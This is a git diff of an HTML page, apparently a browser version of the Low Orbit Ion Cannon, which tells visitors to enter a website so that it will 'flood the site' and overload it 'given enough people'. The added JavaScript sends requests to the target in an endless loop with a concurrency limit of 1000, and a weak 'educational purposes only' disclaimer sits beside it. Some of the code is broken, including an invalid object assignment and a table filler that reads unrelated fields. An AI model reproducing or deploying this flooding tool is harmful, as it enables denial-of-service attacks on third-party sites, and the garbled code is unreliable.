@@ -1,52 +1,97 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <meta charset="utf-8">
-    <title>LOIC HTML DDoS Test</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Top Secret</title>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+        integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="an\
+onymous">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 </head>
+
 <body>
-    <h2 class="title"> DDOS a Website </h2>
-    <ul>
-        <li>
-            <h3>  <b> For educational purposes only obviously </b> </h3>
-            <p class="sub">For security concerns, you are able to simply save the webpage, and run locally - as well as
-                view the source. It is entirely HTML and browser interpreted. <br> Open this page and insert the website, it will flood the site
-                and pose a huge load on their infrastructure given enough people </p>
-
-            <form onSubmit="flood()">
-                <label for="website">Website:</label><br>
-                <input type="text" id="website" name="website"><br>
-                <input type="submit">
-            </form> 
-
-        </li>
-    </ul>
-<!--     
-    <h3 class="desc">Here is the stats of your session (the links and the number of the requests that were sent from
-        your
-        browser:<br>
-        Failed to fetch is normal - if any site has that - that means their servers are under load and are dropping
-        packets - which is the goal!</h3>
-    <div id="stats" class="stats">
+    <div class="jumbotron">
+        <h2>Low Orbit Ion Cannon test</h2>
+        <p> For educational purposes only obviously. For security concerns, you are able to simply save the webpage, and
+            run locally - as well as
+            view the source. It is entirely HTML and browser interpreted. <br> Open this page and insert the website, it
+            will flood the site
+            and pose a huge load on their infrastructure given enough people </p>
     </div>
-    <div id="errors"></div> -->
+
+
+    <div class="container">
+        <form>
+            <div class="form-group">
+                <label for="website">Website</label>
+                <input type="website" class="form-control" id="website" aria-describedby="Enter website address"
+                    placeholder="Enter website address">
+                <small id="websiteHelp" class="form-text text-muted">Keep it in the form of www.example.com</small>
+            </div>
+
+            <button type="submit" class="btn btn-primary" onClick="flood()">Submit</button>
+        </form>
+    </div>
+
+    <div class="row">
+        <table class="table bordered" id="posts">
+            <thead>
+                <tr>
+                    <th>Website</th>
+                    <th>Status code</th>
+                </tr>
+            </thead>
+            <tbody>
+
+            </tbody>
+        </table>
+    </div>
 
     <script>
-        
-        function flood(website) {
-            console.log(website)
+
+        setInterval(processData, 100);
+
+        function processData(result) {
+            $.each(result, function (i, item) {
+                $("#posts").append([
+                    $("<tr>")
+                        .append("<td>" + item.name + "</td>")
+                        .append("<td>" + item.donorNumber + "</td>")
+                ]);
+            })
         }
 
-        var statsEl = document.getElementById('stats');
-        function printStats() {
-            statsEl.innerHTML = '<pre>' + JSON.stringify(targets, null, 2) + '</pre>'
-        }
-        setInterval(printStats, 100);
+        const CONCURRENCY_LIMIT = 1000;
+        var queue = [];
 
-        var CONCURRENCY_LIMIT = 1000
-        var queue = []
+        async function flood() {
+            const website = document.getElementById("website").value
+            const target = website : { numberOfRequest: 0, numberOfErrors: 0 };
+
+            while (true) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift()
+                }
+                queue.push(
+                    fetchWithTimeout(target, { timeout: 1000 })
+                        .catch((error) => {
+                            if (error.code === 20) {
+                                return;
+                            }
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+
+                            }
+                        })
+                )
+            }
+        }
 
         async function fetchWithTimeout(resource, options) {
             const controller = new AbortController();
@@ -63,35 +108,8 @@
             });
         }
 
-        // async function flood(target) {
-        //     while (true) {
-        //         if (queue.length > CONCURRENCY_LIMIT) {
-        //             await queue.shift()
-        //         }
-        //         queue.push(
-        //             fetchWithTimeout(target, { timeout: 2000 })
-        //                 .catch((error) => {
-        //                     if (error.code === 20 /* ABORT */) {
-        //                         return;
-        //                     }
-        //                     targets[target].number_of_errored_responses++;
-        //                     targets[target].error_message = error.message
-        //                 })
-        //                 .then((response) => {
-        //                     if (response && !response.ok) {
-        //                         targets[target].number_of_errored_responses++;
-        //                         targets[target].error_message = response.statusText
-        //                     }
-        //                     targets[target].number_of_requests++;
-        //                 })
 
-
-        //         )
-        //     }
-        // }
-
-        //Start
-        // Object.keys().map(flood)
     </script>
 </body>
+
 </html>
